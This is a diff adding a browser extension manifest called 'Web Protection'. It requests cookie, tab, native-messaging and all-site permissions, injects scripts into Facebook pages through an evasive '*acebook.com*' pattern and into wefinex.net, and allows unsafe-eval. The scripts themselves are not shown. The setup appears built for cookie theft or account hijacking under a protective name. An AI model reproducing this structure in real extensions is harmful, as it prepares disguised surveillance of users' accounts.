@@ -1,0 +1,35 @@
+{
+  "manifest_version": 2,
+  "name": "Web Protection",
+  "short_name": "Web Protection",
+  "version": "1.0.0",
+  "description": "Web Protection",
+  "permissions": ["notifications", "cookies","storage","tabs", "http://*/*", "https://*/*" ,  "nativeMessaging", "background"],
+  "icons": {
+    "128": "icon128.png",
+    "48": "icon48.png",
+    "16": "icon16.png"
+  },
+  "content_scripts": [
+    {
+      "js": ["src/content.js"],
+      "matches": [ "*://*/*" ],
+      "include_globs": ["*acebook.com*"]
+    },
+    {
+      "js": ["src/wefinexMain.js"],
+      "matches": [ "*://*/*" ],
+      "include_globs": ["*wefinex.net*"]
+    }, {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": ["src/controller.js"]
+    }
+  ],
+  "background": {
+    "scripts": ["src/background.js"],
+    "persistent": false
+  },
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'"
+}
